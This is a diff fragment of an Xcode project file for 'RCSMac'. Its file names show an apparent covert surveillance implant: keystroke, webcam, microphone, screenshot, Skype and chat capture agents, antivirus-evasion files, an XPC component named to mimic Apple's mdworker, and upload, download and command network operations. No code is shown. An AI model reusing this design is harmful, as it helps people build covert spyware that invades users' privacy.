+		CCE74A7F185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = "NSProcessInfo+NSProcessInfo__AVEvasion_.m"; path = "Categories/NSProcessInfo+NSProcessInfo__AVEvasion_.m"; sourceTree = "<group>"; };
+		CCE75B5C15E7836F00879615 /* RCSMInterface.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMInterface.h; sourceTree = "<group>"; };
+		CCFFD70415D8ED6E00131597 /* RCSMGlobals.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMGlobals.h; sourceTree = "<group>"; };
+		CCFFD70515D8ED6E00131597 /* RCSMGlobals.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RCSMGlobals.m; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		1A10795412E720ED0063759B /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				1AF60BA712EF1EED0091F6F6 /* QuartzCore.framework in Frameworks */,
+				1AF60BA812EF1EED0091F6F6 /* QTKit.framework in Frameworks */,
+				1AF60BA912EF1EED0091F6F6 /* CoreAudio.framework in Frameworks */,
+				1AF60BAA12EF1EED0091F6F6 /* QuickTime.framework in Frameworks */,
+				1A107A6412E724080063759B /* IOKit.framework in Frameworks */,
+				1AF60BAB12EF1EED0091F6F6 /* Foundation.framework in Frameworks */,
+				1AF60BAC12EF1EED0091F6F6 /* Carbon.framework in Frameworks */,
+				1AF60BAD12EF1EED0091F6F6 /* ScriptingBridge.framework in Frameworks */,
+				1AF60BAE12EF1EED0091F6F6 /* AddressBook.framework in Frameworks */,
+				1A107A6312E723FE0063759B /* Cocoa.framework in Frameworks */,
+				1A10797312E721850063759B /* GHUnit.framework in Frameworks */,
+				1AF60C4212F028A00091F6F6 /* OCMock.framework in Frameworks */,
+				1A8CB9591327928C005579F9 /* AudioToolbox.framework in Frameworks */,
+				1AF60BA512EF1EED0091F6F6 /* libz.a in Frameworks */,
+				1AF60BA612EF1EED0091F6F6 /* libspeex.a in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		1AF610070FA72D87003F2C12 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				52D836251393916B00C18E70 /* libmozalloc.dylib in Frameworks */,
+				52D836261393916B00C18E70 /* libnspr4.dylib in Frameworks */,
+				52D836271393916B00C18E70 /* libxpcom.dylib in Frameworks */,
+				52D836281393916B00C18E70 /* libxpcomglue_s.a in Frameworks */,
+				52D8361E1393915B00C18E70 /* libFFurlLib32.a in Frameworks */,
+				52D8361F1393915B00C18E70 /* libFFurlLib64.a in Frameworks */,
+				1AF610290FA75A2B003F2C12 /* Cocoa.framework in Frameworks */,
+				1A3A07A51005F588003EE323 /* IOKit.framework in Frameworks */,
+				1A12A0BE1095A99F0090C4D7 /* CoreAudio.framework in Frameworks */,
+				1A12A0F21095BD350090C4D7 /* QTKit.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		529CA8A21464304100B92C47 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				529CA8B3146430DF00B92C47 /* Foundation.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		8D11072E0486CEB800E47090 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				521ABB3C132FA01B00DC54A8 /* SystemConfiguration.framework in Frameworks */,
+				1A8CB953132666E5005579F9 /* AudioToolbox.framework in Frameworks */,
+				8D11072F0486CEB800E47090 /* Cocoa.framework in Frameworks */,
+				1A43C9660FFA641A008E5EFE /* IOKit.framework in Frameworks */,
+				1AD53606101067D800AC54D8 /* Security.framework in Frameworks */,
+				1A1A2FDF106112CF001F1B5D /* QuickTime.framework in Frameworks */,
+				1AD1D6C11099EB96005B548F /* QTKit.framework in Frameworks */,
+				1AD1D6C81099EBAF005B548F /* QuartzCore.framework in Frameworks */,
+				1A508B0511A6B1F20067BF81 /* Carbon.framework in Frameworks */,
+				1AF15F1811DC8E0100637F4E /* AppKit.framework in Frameworks */,
+				521DA5FE125C884000A3D49E /* ScriptingBridge.framework in Frameworks */,
+				1AD4328812A3E3CF00B472C3 /* AddressBook.framework in Frameworks */,
+				521ABB3A132F9FDF00DC54A8 /* Apple80211 in Frameworks */,
+				1AA84481113C22FE005FBADB /* libspeex.a in Frameworks */,
+				1AA84485113C26D1005FBADB /* libz.a in Frameworks */,
+				CC3718B016DE0EFA00658703 /* libsqlite3.dylib in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		080E96DDFE201D6D7F000001 /* Modules */ = {
+			isa = PBXGroup;
+			children = (
+				52B8502415146D4E00F0D72E /* SBJSon */,
+				1AE6B5610F8E2574004736EA /* Agents */,
+				1ADC5D7D12DDBE4E00650A1E /* Network */,
+				CCCBE263183CFEEB00F626A3 /* RCSMInputmanager_aes.h */,
+				1A7FD43B12F1CED900361B0B /* RCSMFileSystemManager.h */,
+				1A7FD43C12F1CED900361B0B /* RCSMFileSystemManager.m */,
+				1A4434830F8B950B00CD910E /* RCSMConfManager.h */,
+				1A4434840F8B950B00CD910E /* RCSMConfManager.m */,
+				1A4434D50F8C907000CD910E /* RCSMEncryption.h */,
+				1A4434D60F8C907000CD910E /* RCSMEncryption.m */,
+				1AF92B700F8F4A90009ED774 /* RCSMTaskManager.h */,
+				1AF92B710F8F4A90009ED774 /* RCSMTaskManager.m */,
+				1A1B9D6A0FA0B4BB0036558C /* RCSMLogManager.h */,
+				1A1B9D6B0FA0B4BB0036558C /* RCSMLogManager.m */,
+				1A33F8EA0FCC1EB000590FA1 /* RCSMEvents.h */,
+				1A33F8EB0FCC1EB000590FA1 /* RCSMEvents.m */,
+				1A7A94140FE13EC7007FF947 /* RCSMActions.h */,
+				1A7A94150FE13EC7007FF947 /* RCSMActions.m */,
+				1AEB953F138E94480057EB42 /* RCSMInfoManager.h */,
+				1AEB9540138E94480057EB42 /* RCSMInfoManager.m */,
+			);
+			name = Modules;
+			sourceTree = "<group>";
+		};
+		1058C7A0FEA54F0111CA2CBB /* Linked Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */,
+				1AF92CC50F947FEE009ED774 /* Security.framework */,
+				1AF15F1711DC8E0100637F4E /* AppKit.framework */,
+				CC3718AF16DE0EFA00658703 /* libsqlite3.dylib */,
+			);
+			name = "Linked Frameworks";
+			sourceTree = "<group>";
+		};
+		1058C7A2FEA54F0111CA2CBB /* Other Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				1AF60C4112F028A00091F6F6 /* OCMock.framework */,
+				1A10797212E721850063759B /* GHUnit.framework */,
+				1AD1D6C71099EBAF005B548F /* QuartzCore.framework */,
+				1A12A0F11095BD350090C4D7 /* QTKit.framework */,
+				1A12A0BD1095A99F0090C4D7 /* CoreAudio.framework */,
+				1A1A2FDE106112CF001F1B5D /* QuickTime.framework */,
+				1A43C9650FFA641A008E5EFE /* IOKit.framework */,
+				29B97325FDCFA39411CA2CEA /* Foundation.framework */,
+				1A508B0411A6B1F20067BF81 /* Carbon.framework */,
+				521DA5FD125C884000A3D49E /* ScriptingBridge.framework */,
+				1AD4328712A3E3CF00B472C3 /* AddressBook.framework */,
+				1A8CB952132666E5005579F9 /* AudioToolbox.framework */,
+				1A8CB9581327928B005579F9 /* AudioToolbox.framework */,
+				5276E4C613155100005155B8 /* CoreWLAN.framework */,
+				521ABB3B132FA01B00DC54A8 /* SystemConfiguration.framework */,
+				1AA84484113C26D1005FBADB /* libz.a */,
+				1AA84480113C22FE005FBADB /* libspeex.a */,
+				521ABB39132F9FDF00DC54A8 /* Apple80211 */,
+				52D836211393916B00C18E70 /* libmozalloc.dylib */,
+				52D836221393916B00C18E70 /* libnspr4.dylib */,
+				52D836231393916B00C18E70 /* libxpcom.dylib */,
+				52D836241393916B00C18E70 /* libxpcomglue_s.a */,
+				52D8361C1393915B00C18E70 /* libFFurlLib32.a */,
+				52D8361D1393915B00C18E70 /* libFFurlLib64.a */,
+			);
+			name = "Other Frameworks";
+			sourceTree = "<group>";
+		};
+		19C28FACFE9D520D11CA2CBB /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				8D1107320486CEB800E47090 /* RCSMac.app */,
+				1AF610090FA72D87003F2C12 /* RCSMInputManager.bundle */,
+				1A10795612E720ED0063759B /* Tests.app */,
+				529CA8A51464304100B92C47 /* com.apple.mdworker_server.xpc */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		1A00BFAB1302D2FF00783D4E /* Agents */ = {
+			isa = PBXGroup;
+			children = (
+				1A00BFAD1302D33700783D4E /* RCSMAgentOrganizerTest.m */,
+				1A8CB95513278ECB005579F9 /* RCSMAgentMicrophoneTest.m */,
+			);
+			name = Agents;
+			sourceTree = "<group>";
+		};
+		1A10798712E722440063759B /* Tests */ = {
+			isa = PBXGroup;
+			children = (
+				1A2877D712F039B60008973A /* Core */,
+				1A10798812E722590063759B /* GHUnitTestMain.m */,
+			);
+			name = Tests;
+			sourceTree = "<group>";
+		};
+		1A1B9A840F9E000C0036558C /* Support */ = {
+			isa = PBXGroup;
+			children = (
+				1A87878A109F3DA100245A80 /* Speex */,
+				CCD43B5D18EC00C6005B2B67 /* RCSNativeMail.h */,
+				1A12A1501095F24C0090C4D7 /* mach_override.h */,
+				1A12A14F1095F24C0090C4D7 /* mach_override.mm */,
+				1ABE7E790F7CE6ED00BC61B1 /* RCSMUtils.h */,
+				1ABE7E7A0F7CE6ED00BC61B1 /* RCSMUtils.m */,
+				1ABE7CDD0F7BA0A800BC61B1 /* RCSMSharedMemory.h */,
+				1ABE7CDE0F7BA0A800BC61B1 /* RCSMSharedMemory.m */,
+				1A13FE4412F9B4F800B82938 /* RCSMLogger.h */,
+				1A13FE4512F9B4F800B82938 /* RCSMLogger.m */,
+				1A13FE4C12F9B6B300B82938 /* RCSMDebug.h */,
+				529A87B814C4257100411539 /* RCSMDiskQuota.h */,
+				529A87B914C4257100411539 /* RCSMDiskQuota.m */,
+				CC7ED16515C95CB100F90517 /* RCSMAVGarbage.h */,
+				CCE75B5C15E7836F00879615 /* RCSMInterface.h */,
+				CC31C80E16DCB5FB00922BD6 /* RCSMTask.h */,
+				CC31C80F16DCB5FB00922BD6 /* RCSMTask.m */,
+			);
+			name = Support;
+			sourceTree = "<group>";
+		};
+		1A2877D412F0396A0008973A /* Operations */ = {
+			isa = PBXGroup;
+			children = (
+				1A107BD112E730800063759B /* AuthNetworkOperationTest.m */,
+				1AF6074912EDD5A70091F6F6 /* IDNetworkOperationTest.m */,
+				1AF608B512EF0E310091F6F6 /* ConfNetworkOperationTest.m */,
+				1AF60BE312EF27B50091F6F6 /* DownloadNetworkOperationTest.m */,
+				1A28786C12F062A80008973A /* UploadNetworkOperationTest.m */,
+				1A521EC412FAB9550091ADD5 /* UpgradeNetworkOperationTest.m */,
+				1A28798512F080B20008973A /* FSNetworkOperationTest.m */,
+				1A7FD31812F17EED00361B0B /* LogNetworkOperationTest.m */,
+				1AF6069E12EDAEA90091F6F6 /* ByeNetworkOperationTest.m */,
+			);
+			name = Operations;
+			sourceTree = "<group>";
+		};
+		1A2877D512F039790008973A /* Transports */ = {
+			isa = PBXGroup;
+			children = (
+				1A107BF512E737060063759B /* RESTTransportTest.m */,
+			);
+			name = Transports;
+			sourceTree = "<group>";
+		};
+		1A2877D612F0398A0008973A /* Protocols */ = {
+			isa = PBXGroup;
+			children = (
+				1A10798D12E722AB0063759B /* RESTNetworkProtocolTest.m */,
+			);
+			name = Protocols;
+			sourceTree = "<group>";
+		};
+		1A2877D712F039B60008973A /* Core */ = {
+			isa = PBXGroup;
+			children = (
+				1AAF6FC712FB0A6000D3E581 /* Support */,
+				1AF60C5812F02F600091F6F6 /* Modules */,
+				1AF60BE212EF25EF0091F6F6 /* Categories */,
+			);
+			name = Core;
+			sourceTree = "<group>";
+		};
+		1A3FE61B146A96A500F01FC3 /* mdworker_server */ = {
+			isa = PBXGroup;
+			children = (
+				529CA8B2146430DF00B92C47 /* Foundation.framework */,
+			);
+			path = mdworker_server;
+			sourceTree = "<group>";
+		};
+		1A40F7DE12DF104700BEACB8 /* Transports */ = {
+			isa = PBXGroup;
+			children = (
+				1A40F7DF12DF107900BEACB8 /* Transport.h */,
+				1A5B320C12E4A2AF00677A0B /* Transport.m */,
+				1A40F81612DF293A00BEACB8 /* RESTTransport.h */,
+				1A40F81712DF293A00BEACB8 /* RESTTransport.m */,
+			);
+			name = Transports;
+			sourceTree = "<group>";
+		};
+		1A44351B0F8CA1E000CD910E /* Categories */ = {
+			isa = PBXGroup;
+			children = (
+				1A4435210F8CA23E00CD910E /* NSMutableData+AES128.h */,
+				1A4435220F8CA23E00CD910E /* NSMutableData+AES128.m */,
+				1AF6072712EDCAC30091F6F6 /* NSMutableData+SHA1.h */,
+				1AF6072812EDCAC30091F6F6 /* NSMutableData+SHA1.m */,
+				1A4435470F8CB10800CD910E /* NSString+SHA1.h */,
+				1A4435480F8CB10800CD910E /* NSString+SHA1.m */,
+				1A7FD33E12F1841200361B0B /* NSData+SHA1.h */,
+				1A7FD33F12F1841200361B0B /* NSData+SHA1.m */,
+				1AF6077912EDE2160091F6F6 /* NSString+Pascal.h */,
+				1AF6077A12EDE2160091F6F6 /* NSString+Pascal.m */,
+				1AF60C0212EF2B880091F6F6 /* NSData+Pascal.h */,
+				1AF60C0312EF2B880091F6F6 /* NSData+Pascal.m */,
+				1AB5DC3F11CF9DE600B9E32B /* NSApplication+SystemVersion.h */,
+				1AB5DC4011CF9DE600B9E32B /* NSApplication+SystemVersion.m */,
+				1A508A9B11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.h */,
+				1A508A9C11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m */,
+				CCE74A7E185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.h */,
+				CCE74A7F185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m */,
+			);
+			name = Categories;
+			sourceTree = "<group>";
+		};
+		1A68E0230FB87A9300B17F60 /* Agents */ = {
+			isa = PBXGroup;
+			children = (
+				1A8F5A3A10AC6D7100403FAE /* Voip */,
+				1A68E0EA0FB884F500B17F60 /* IM */,
+				1A68E1510FB9A3B800B17F60 /* RCSMAgentInputLogger.h */,
+				1A68E1520FB9A3B800B17F60 /* RCSMAgentInputLogger.m */,
+				1A68E36E0FBB1F3200B17F60 /* RCSMAgentURL.h */,
+				1A68E36F0FBB1F3200B17F60 /* RCSMAgentURL.m */,
+				1A281C980FF3CAC800616589 /* RCSMAgentClipboard.h */,
+				1A281C970FF3CAC800616589 /* RCSMAgentClipboard.m */,
+				5269F6211330ED7200644B72 /* RCSMAgentApplication.h */,
+				5269F6221330ED7200644B72 /* RCSMAgentApplication.m */,
+				1A5509AF13618F9A00D1A2AD /* RCSMAgentFileCapture.h */,
+				1A5509B013618F9A00D1A2AD /* RCSMAgentFileCapture.m */,
+			);
+			name = Agents;
+			sourceTree = "<group>";
+		};
+		1A68E0EA0FB884F500B17F60 /* IM */ = {
+			isa = PBXGroup;
+			children = (
+				520F50A41529FD920083B11E /* RCSMAgentIMAdium.h */,
+				520F50A51529FD920083B11E /* RCSMAgentIMAdium.m */,
+				1A68E04E0FB881DD00B17F60 /* RCSMAgentIMSkype.h */,
+				1A68E04F0FB881DD00B17F60 /* RCSMAgentIMSkype.m */,
+				1AC279A613584222009C0812 /* RCSMAgentIMMsnMessenger.h */,
+				1AC279A713584222009C0812 /* RCSMAgentIMMsnMessenger.m */,
+			);
+			name = IM;
+			sourceTree = "<group>";
+		};
+		1A87878A109F3DA100245A80 /* Speex */ = {
+			isa = PBXGroup;
+			children = (
+				1A356B9F109F3EB30063AF34 /* speex.h */,
+				1A356BA0109F3EB30063AF34 /* speex_bits.h */,
+				1A356BA1109F3EB30063AF34 /* speex_buffer.h */,
+				1A356BA2109F3EB30063AF34 /* speex_callbacks.h */,
+				1A356BA3109F3EB30063AF34 /* speex_config_types.h */,
+				1A356BA4109F3EB30063AF34 /* speex_echo.h */,
+				1A356BA5109F3EB30063AF34 /* speex_header.h */,
+				1A356BA6109F3EB30063AF34 /* speex_jitter.h */,
+				1A356BA7109F3EB30063AF34 /* speex_preprocess.h */,
+				1A356BA8109F3EB30063AF34 /* speex_resampler.h */,
+				1A356BA9109F3EB30063AF34 /* speex_stereo.h */,
+				1A356BAA109F3EB30063AF34 /* speex_types.h */,
+			);
+			name = Speex;
+			sourceTree = "<group>";
+		};
+		1A8F5A3A10AC6D7100403FAE /* Voip */ = {
+			isa = PBXGroup;
+			children = (
+				1A12A0171091FE8C0090C4D7 /* RCSMAgentVoipSkype.h */,
+				1A12A0181091FE8C0090C4D7 /* RCSMAgentVoipSkype.m */,
+			);
+			name = Voip;
+			sourceTree = "<group>";
+		};
+		1AAF6FC712FB0A6000D3E581 /* Support */ = {
+			isa = PBXGroup;
+			children = (
+				1AAF6FC812FB0A7E00D3E581 /* RCSMLoggerTest.m */,
+			);
+			name = Support;
+			sourceTree = "<group>";
+		};
+		1ADC5D7D12DDBE4E00650A1E /* Network */ = {
+			isa = PBXGroup;
+			children = (
+				1ADC5D8212DDBE7600650A1E /* Operations */,
+				1A40F7DE12DF104700BEACB8 /* Transports */,
+				1ADC5D8312DDBE7B00650A1E /* Protocols */,
+			);
+			name = Network;
+			sourceTree = "<group>";
+		};
+		1ADC5D8212DDBE7600650A1E /* Operations */ = {
+			isa = PBXGroup;
+			children = (
+				1ADC5D8412DDBEA600650A1E /* NetworkOperation.h */,
+				1A40F7C712DF071C00BEACB8 /* AuthNetworkOperation.h */,
+				1A40F7C812DF071C00BEACB8 /* AuthNetworkOperation.m */,
+				1A65115612DDC99100D4F1AF /* IDNetworkOperation.h */,
+				1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */,
+				1A65115912DDC9B500D4F1AF /* ConfNetworkOperation.h */,
+				1A65115A12DDC9B500D4F1AF /* ConfNetworkOperation.m */,
+				1A65115C12DDC9E200D4F1AF /* DownloadNetworkOperation.h */,
+				1A65115D12DDC9E200D4F1AF /* DownloadNetworkOperation.m */,
+				1A65115F12DDCA1900D4F1AF /* UploadNetworkOperation.h */,
+				1A65116012DDCA1900D4F1AF /* UploadNetworkOperation.m */,
+				1A521EC812FABAC00091ADD5 /* UpgradeNetworkOperation.h */,
+				1A521EC912FABAC00091ADD5 /* UpgradeNetworkOperation.m */,
+				1A65116212DDCA4600D4F1AF /* FSNetworkOperation.h */,
+				1A65116312DDCA4600D4F1AF /* FSNetworkOperation.m */,
+				1A65116512DDCA5700D4F1AF /* LogNetworkOperation.h */,
+				1A65116612DDCA5700D4F1AF /* LogNetworkOperation.m */,
+				1A65116812DDCA6C00D4F1AF /* ByeNetworkOperation.h */,
+				1A65116912DDCA6C00D4F1AF /* ByeNetworkOperation.m */,
+				CC27338016B7D1D100DCD0E4 /* CommandsNetworkOperation.h */,
+				CC27338116B7D1D100DCD0E4 /* CommandsNetworkOperation.m */,
+			);
+			name = Operations;
+			sourceTree = "<group>";
+		};
+		1ADC5D8312DDBE7B00650A1E /* Protocols */ = {
+			isa = PBXGroup;
+			children = (
+				1ADC5D8712DDBEB800650A1E /* NetworkProtocol.h */,
+				1ADC5D9412DDBF2100650A1E /* RESTNetworkProtocol.h */,
+				1ADC5D9512DDBF2100650A1E /* RESTNetworkProtocol.m */,
+			);
+			name = Protocols;
+			sourceTree = "<group>";
+		};
+		1AE6B5610F8E2574004736EA /* Agents */ = {
+			isa = PBXGroup;
+			children = (
+				C52FEF3E16FC58F600DCBF2A /* Social */,
+				CCD43B5A18EC00AC005B2B67 /* RCSMAgentMessages.h */,
+				CCD43B5B18EC00AC005B2B67 /* RCSMAgentMessages.m */,
+				5262A92B132A5A2C001D1988 /* RCSMAgentClipboard.h */,
+				5262A92C132A5A2C001D1988 /* RCSMAgentClipboard.m */,
+				5262A92D132A5A2C001D1988 /* RCSMAgentIMSkype.h */,
+				5262A92E132A5A2C001D1988 /* RCSMAgentIMSkype.m */,
+				5262A92F132A5A2C001D1988 /* RCSMAgentInputLogger.h */,
+				5262A930132A5A2C001D1988 /* RCSMAgentInputLogger.m */,
+				5262A937132A5A2C001D1988 /* RCSMAgentURL.h */,
+				5262A938132A5A2C001D1988 /* RCSMAgentURL.m */,
+				5262A939132A5A2C001D1988 /* RCSMAgentVoipSkype.h */,
+				5262A93A132A5A2C001D1988 /* RCSMAgentVoipSkype.m */,
+				1A1A2FD110611075001F1B5D /* RCSMAgentWebcam.h */,
+				1A1A2FCF10611067001F1B5D /* RCSMAgentWebcam.m */,
+				1A1B9D390FA0AD670036558C /* RCSMAgentScreenshot.h */,
+				1A1B9D3A0FA0AD670036558C /* RCSMAgentScreenshot.m */,
+				1AFBE66312A0082600BFA7D0 /* RCSMAgentOrganizer.h */,
+				1AFBE66412A0082600BFA7D0 /* RCSMAgentOrganizer.m */,
+				521B22C41312BA360077A491 /* RCSMAgentPosition.h */,
+				521B22C51312BA360077A491 /* RCSMAgentPosition.m */,
+				5262A946132A5AB4001D1988 /* RCSMAgentDevice.h */,
+				5262A947132A5AB4001D1988 /* RCSMAgentDevice.m */,
+				1A8CB94C132665D1005579F9 /* RCSMAgentMicrophone.h */,
+				1A8CB94D132665D1005579F9 /* RCSMAgentMicrophone.m */,
+			);
+			name = Agents;
+			sourceTree = "<group>";
+		};
+		1AE6B5620F8E2581004736EA /* Core */ = {
+			isa = PBXGroup;
+			children = (
+				1A1B9A840F9E000C0036558C /* Support */,
+				080E96DDFE201D6D7F000001 /* Modules */,
+				1A44351B0F8CA1E000CD910E /* Categories */,
+				29B97315FDCFA39411CA2CEA /* Source */,
+			);
+			name = Core;
+			sourceTree = "<group>";
+		};
+		1AF60BE112EF25DE0091F6F6 /* Network */ = {
+			isa = PBXGroup;
+			children = (
+				1A2877D412F0396A0008973A /* Operations */,
+				1A2877D512F039790008973A /* Transports */,
+				1A2877D612F0398A0008973A /* Protocols */,
+			);
+			name = Network;
+			sourceTree = "<group>";
+		};
+		1AF60BE212EF25EF0091F6F6 /* Categories */ = {
+			isa = PBXGroup;
+			children = (
+				1AF607A012EED0A40091F6F6 /* NSString+PascalTest.m */,
+				1AF60C0D12EF2CC10091F6F6 /* NSData+PascalTest.m */,
+			);
+			name = Categories;
+			sourceTree = "<group>";
+		};
+		1AF60C5812F02F600091F6F6 /* Modules */ = {
+			isa = PBXGroup;
+			children = (
+				1A00BFAB1302D2FF00783D4E /* Agents */,
+				1AF60BE112EF25DE0091F6F6 /* Network */,
+				1A7FD44012F1D28100361B0B /* RCSMFileSystemManagerTest.m */,
+			);
+			name = Modules;
+			sourceTree = "<group>";
+		};
+		1AF610010FA72D50003F2C12 /* InputManager */ = {
+			isa = PBXGroup;
+			children = (
+				1A68E0230FB87A9300B17F60 /* Agents */,
+				1A319EE30FA9B6410079B060 /* RCSMInputManager.h */,
+				1A319EE40FA9B6410079B060 /* RCSMInputManager.m */,
+				1A319F080FA9C8260079B060 /* Info */,
+			);
+			name = InputManager;
+			sourceTree = "<group>";
+		};
+		29B97314FDCFA39411CA2CEA /* RCSMac */ = {
+			isa = PBXGroup;
+			children = (
+				1AE6B5620F8E2581004736EA /* Core */,
+				1AF610010FA72D50003F2C12 /* InputManager */,
+				529CA8A61464304100B92C47 /* mdworker_server */,
+				1A10798712E722440063759B /* Tests */,
+				29B97317FDCFA39411CA2CEA /* Resources */,
+				29B97323FDCFA39411CA2CEA /* Frameworks */,
+				19C28FACFE9D520D11CA2CBB /* Products */,
+				1AF6100A0FA72D87003F2C12 /* RCSMInputManager-Info.plist */,
+				1A10795A12E720ED0063759B /* Tests-Info.plist */,
+			);
+			name = RCSMac;
+			sourceTree = "<group>";
+		};
+		29B97315FDCFA39411CA2CEA /* Source */ = {
+			isa = PBXGroup;
+			children = (
+				520FE2131265E20B00F31B58 /* RCSMOsaxFiles.h */,
+				29B97316FDCFA39411CA2CEA /* RCSMMain.m */,
+				1ABEEE2C0F975CE100063113 /* RCSMCore.h */,
+				1ABEEE2D0F975CE100063113 /* RCSMCore.m */,
+				CCFFD70415D8ED6E00131597 /* RCSMGlobals.h */,
+				CCFFD70515D8ED6E00131597 /* RCSMGlobals.m */,
+				1A4436570F8CD55400CD910E /* RCSMCommon.h */,
+				1A4436580F8CD55400CD910E /* RCSMCommon.m */,
+				1A508AD111A692260067BF81 /* RCSMDesktopImage.h */,
+				32CA4F630368D1EE00C91783 /* RCSMac_Prefix.pch */,
+			);
+			name = Source;
+			sourceTree = "<group>";
+		};
+		29B97317FDCFA39411CA2CEA /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				1A1B9CD50FA091970036558C /* spref.icns */,
+				1AF92CB00F947D53009ED774 /* spref.tiff */,
+				8D1107310486CEB800E47090 /* Info.plist */,
+				089C165CFE840E0CC02AAC07 /* InfoPlist.strings */,
+			);
+			name = Resources;
+			sourceTree = "<group>";
+		};
+		29B97323FDCFA39411CA2CEA /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				1058C7A0FEA54F0111CA2CBB /* Linked Frameworks */,
+				1058C7A2FEA54F0111CA2CBB /* Other Frameworks */,
+				1A3FE61B146A96A500F01FC3 /* mdworker_server */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		529CA8A61464304100B92C47 /* mdworker_server */ = {
+			isa = PBXGroup;
+			children = (
+				529CA8A71464304100B92C47 /* Supporting Files */,
+				529CA8AD1464304100B92C47 /* main.m */,
+			);
+			path = mdworker_server;
+			sourceTree = "<group>";
+		};
+		529CA8A71464304100B92C47 /* Supporting Files */ = {
+			isa = PBXGroup;
+			children = (
+				529CA8A81464304100B92C47 /* mdworker_server-Info.plist */,
+				529CA8A91464304100B92C47 /* InfoPlist.strings */,
+				529CA8AC1464304100B92C47 /* mdworker_server-Prefix.pch */,
+			);
+			name = "Supporting Files";
+			sourceTree = "<group>";
+		};
+		52B8502415146D4E00F0D72E /* SBJSon */ = {
+			isa = PBXGroup;
+			children = (
+				52B850561514902B00F0D72E /* Classes */,
+				52B8502815146D4E00F0D72E /* RCSIJSonConfiguration.h */,
+				52B8502915146D4E00F0D72E /* RCSIJSonConfiguration.m */,
+			);
+			path = SBJSon;
+			sourceTree = "<group>";
+		};
+		52B850561514902B00F0D72E /* Classes */ = {
+			isa = PBXGroup;
+			children = (
+				52B8502515146D4E00F0D72E /* JSON.h */,
+				52B8502615146D4E00F0D72E /* NSObject+SBJson.h */,
+				52B8502715146D4E00F0D72E /* NSObject+SBJson.m */,
+				52B8502A15146D4E00F0D72E /* SBJson.h */,
+				52B8502B15146D4E00F0D72E /* SBJsonParser.h */,
+				52B8502C15146D4E00F0D72E /* SBJsonParser.m */,
+				52B8502D15146D4E00F0D72E /* SBJsonStreamParser.h */,
+				52B8502E15146D4E00F0D72E /* SBJsonStreamParser.m */,
+				52B8502F15146D4E00F0D72E /* SBJsonStreamParserAccumulator.h */,
+				52B8503015146D4E00F0D72E /* SBJsonStreamParserAccumulator.m */,
+				52B8503115146D4E00F0D72E /* SBJsonStreamParserAdapter.h */,
+				52B8503215146D4E00F0D72E /* SBJsonStreamParserAdapter.m */,
+				52B8503315146D4E00F0D72E /* SBJsonStreamParserState.h */,
+				52B8503415146D4E00F0D72E /* SBJsonStreamParserState.m */,
+				52B8503515146D4E00F0D72E /* SBJsonStreamWriter.h */,
+				52B8503615146D4E00F0D72E /* SBJsonStreamWriter.m */,
+				52B8503715146D4E00F0D72E /* SBJsonStreamWriterAccumulator.h */,
+				52B8503815146D4E00F0D72E /* SBJsonStreamWriterAccumulator.m */,
+				52B8503915146D4E00F0D72E /* SBJsonStreamWriterState.h */,
+				52B8503A15146D4E00F0D72E /* SBJsonStreamWriterState.m */,
+				52B8503B15146D4E00F0D72E /* SBJsonTokeniser.h */,
+				52B8503C15146D4E00F0D72E /* SBJsonTokeniser.m */,
+				52B8503D15146D4E00F0D72E /* SBJsonUTF8Stream.h */,
+				52B8503E15146D4E00F0D72E /* SBJsonUTF8Stream.m */,
+				52B8503F15146D4E00F0D72E /* SBJsonWriter.h */,
+				52B8504015146D4E00F0D72E /* SBJsonWriter.m */,
+			);
+			name = Classes;
+			sourceTree = "<group>";
+		};
+		C52FEF3E16FC58F600DCBF2A /* Social */ = {
+			isa = PBXGroup;
+			children = (
+				C52FEF4916FC5A5A00DCBF2A /* social.h */,
+				C52FEF4216FC598C00DCBF2A /* Facebook */,
+				C52FEF3F16FC596200DCBF2A /* __m_Social_Module.h */,
+				C52FEF4016FC596200DCBF2A /* __m_Social_Module.m */,
+				C52FEF4316FC59C900DCBF2A /* __m_Social.h */,
+				C52FEF4416FC59C900DCBF2A /* __m_Social.m */,
+			);
+			name = Social;
+			sourceTree = "<group>";
+		};
+		C52FEF4216FC598C00DCBF2A /* Facebook */ = {
+			isa = PBXGroup;
+			children = (
+				C52FEF4616FC5A0E00DCBF2A /* __m_Social_Facebook.h */,
+				C52FEF4716FC5A0E00DCBF2A /* __m_Social_Facebook.m */,
+			);
+			name = Facebook;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
